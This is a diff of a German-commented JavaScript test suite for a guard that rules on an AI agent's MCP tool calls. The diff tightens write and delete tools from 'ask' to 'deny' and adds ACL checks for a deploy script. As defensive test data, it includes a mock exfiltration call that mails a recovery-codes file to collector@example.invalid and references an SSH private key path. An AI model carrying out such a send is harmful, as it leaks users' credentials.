@@ -1172,7 +1172,7 @@ for (const [name, ok] of [...mcpCritIntentChecks, ...mcpCritResourceChecks, ...m
 console.log("-- MCP: Kriterien (Schritt B)\n")
 
 // --- MCP-Entscheidung in drei Schichten (Schritt C, 04.11.2026) ---
-// Ebene 1 ordnet ein (lesend allow, schreibend/loeschend ask, unklar model),
+// Ebene 1 ordnet ein (lesend allow, schreibend/loeschend deny, unklar model),
 // Ebene 2 ist die Notbremse (nur klare Faelle, deny), Ebene 3 ist das lokale
 // Modell und darf ausschliesslich "ask" zu "allow" heben. Geprueft wird hier
 // die Entscheidungslogik, nicht das Backend.
@@ -1180,15 +1180,15 @@ const verdictCase = (tool, input, agent) => mcpVerdict(mcpCriteria(tool, { input
 const mcpLayer1 = [
   ["exa_web_search_exa", { query: "x" }, "allow"],
   ["github_get_issue", { owner: "a", repo: "b", issue_number: 1 }, "allow"],
-  ["github_create_issue", { title: "x", body: "y" }, "ask"],
-  ["firecrawl_monitor_run", { id: "m" }, "ask"],
-  ["firecrawl_monitor_delete", { id: "m" }, "ask"],
+  ["github_create_issue", { title: "x", body: "y" }, "deny"],
+  ["firecrawl_monitor_run", { id: "m" }, "deny"],
+  ["firecrawl_monitor_delete", { id: "m" }, "deny"],
   ["firecrawl_scrape", {}, "ask"],
   ["github_create_issue", { title: "x", body: "token abc" }, "ask"],
   ["github_create_issue", { title: "x", body: "y".repeat(40000) }, "deny"],
   ["exa_web_search_exa", { query: "y".repeat(40000) }, "allow"],
-  ["sync_status", { project: "x" }, "ask"],
-  ["sync", { project: "x" }, "ask"],
+  ["sync_status", { project: "x" }, "deny"],
+  ["sync", { project: "x" }, "deny"],
   ["voellig_unbekannt", { ziel: "irgendwas" }, "model"],
   // Belegte Lese-Werkzeuge ohne Verb im Namen (20.11.2026). Die Liste ist eine
   // Namensliste: ein fremdes `exec` bleibt unbekannt.
@@ -1387,7 +1387,7 @@ const mcpArgIntentChecks = [
   ["ein Feldname entschaerft nie", cQueryOnly.action.intent === "unknown"],
   ["archive=true ist schreibend", cArchive.action.intent === "write" && cArchive.action.verb === "archive"],
   ["archive=false ist nicht schreibend", cArchiveOff.action.intent === "unknown"],
-  ["reset=true ergibt Rueckfrage", mcpVerdict(cReset, { target: "production", reset: true }).decision === "ask"],
+  ["reset=true ergibt Verbot", mcpVerdict(cReset, { target: "production", reset: true }).decision === "deny"],
 ]
 
 const exfil = mcpVerdict(argCase("mcp_mail_send", { to: "collector@example.invalid", attachment: "/home/developer/recovery-codes.txt" }), {
@@ -1399,7 +1399,7 @@ const issueWithKey = argCase("github_create_issue", { title: "x", body: "Pfad: C
 const mcpExfilChecks = [
   ["Zugangsdaten nach aussen: deny", exfil.decision === "deny" && exfil.layer === 2],
   ["Ablauf nennt den Dateipfad nicht", !exfil.reason.includes("recovery-codes") && !exfil.reason.includes("/home/")],
-  ["normale Anlage bleibt Rueckfrage", report.decision === "ask" && report.layer === 1],
+  ["normale Anlage wird verboten", report.decision === "deny" && report.layer === 1],
   ["kein Versand: kein Datenabfluss-Verbot", mcpVerdict(issueWithKey, { title: "x", body: "Pfad: C:\\Users\\me\\.ssh\\id_rsa" }).layer === 1],
   ["Wiederherstellungscodes zaehlen als Geheimnis", argCase("mcp_mail_send", { attachment: "/home/x/recovery-codes.txt" }).context.secret === true],
 ]
@@ -2521,6 +2521,16 @@ for (const [name, ok] of localhostChecks) {
 }
 console.log("-- Localhost-Zwang (23.11.2026)\n")
 
+// G-04/A10 (24.11.2026): ACL-Pruefung fest verdrahtet.
+const deployText = readFileSync(join(dirname(fileURLToPath(import.meta.url)), "..", "scripts", "deploy.ps1"), "utf-8")
+const aclChecks = [
+  ["deploy ruft ACL-Pruefung immer auf", deployText.includes("verify-runtime-acl.ps1")],
+  ["deploy bricht bei ACL-Fehler (Stop)", deployText.includes('$ErrorActionPreference = "Stop"')],
+]
+for (const [name, ok] of aclChecks) {
+  if (!ok) failed++
+  console.log(`${ok ? "ok  " : "FAIL"}  ${name}`)}
+console.log("-- ACL-Verdrahtung (24.11.2026)\n")
 const total =
   base.length + scoped.length + gitGuardrails.length + cli.length + helpVersion.length + gitleaks.length +
   readOnlyCli.length +
@@ -2532,7 +2542,7 @@ const total =
   mcpCritIntentChecks.length + mcpCritResourceChecks.length + mcpCritChecks.length +
   mcpLayer1Checks.length + mcpLayer2Checks.length + mcpPriorityChecks.length +
   mcpActionChecks.length + mcpPromptChecks.length + mcpAnswerChecks.length + mcpReviewChecks.length +
-  mcpArgIntentChecks.length + mcpExfilChecks.length + mcpUnresolvedChecks.length + localhostChecks.length +
+  mcpArgIntentChecks.length + mcpExfilChecks.length + mcpUnresolvedChecks.length + localhostChecks.length + aclChecks.length +
   reviewerRisky.length + reviewerGit.length + reviewerNoise.length + reviewerParsing.length + scopeChecks.length + statsChecks.length + verdictChecks.length + auditChecks.length + reportChecks.length + systemoneChecks.length + thresholdChecks.length + warmupChecks.length + abortWarmupChecks.length + diagnosticsChecks.length + 3 + reviewFixes.length + reviewFixesScoped.length + reviewBlock.length + pipelineBlocks.length + blockReasons.length + 1 + secretsChecks.length + fourAxesChecks.length + editCases.length + injectionChecks.length + 2 + 11 + 3 + 3 + 1
 console.log(`${total - failed}/${total} bestanden`)
 process.exit(failed ? 1 : 0)
